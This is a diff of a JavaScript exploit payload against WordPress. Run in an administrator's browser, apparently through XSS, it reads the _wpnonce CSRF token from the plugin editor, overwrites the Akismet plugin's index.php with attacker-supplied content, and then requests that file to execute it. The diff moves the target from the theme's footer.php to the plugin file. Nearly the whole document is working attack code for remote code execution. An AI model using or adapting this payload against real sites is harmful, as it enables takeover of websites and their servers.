@@ -8,7 +8,7 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-var page = httpGet("/wp-admin/theme-editor.php?file=footer.php&theme=%s")
+var page = httpGet("/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php")
 
 function httpPost(theUrl, csrftoken)
 {
@@ -17,7 +17,7 @@ function httpPost(theUrl, csrftoken)
     xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "POST", theUrl, false );
     xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/theme-editor.php?file=footer.php&theme=%s&newcontent=%s&action=update&file=footer.php&theme=%s&scrollto=0&docs-list=&submit=Update+File");
+    xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php&newcontent=%s&action=update&file=akismet/index.php&plugin=akismet/index.php&scrollto=0&submit=Update+File");
     return xmlHttp.responseText;
 
 }
@@ -27,5 +27,5 @@ var regExp = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
 var matches = regExp.exec(page);
 var csrftoken = matches[1].slice(0, 10);
 
-httpPost("/wp-admin/theme-editor.php", csrftoken);
-httpGet("/");
+httpPost("/wp-admin/plugin-editor.php", csrftoken);
+httpGet("/wp-content/plugins/akismet/index.php");
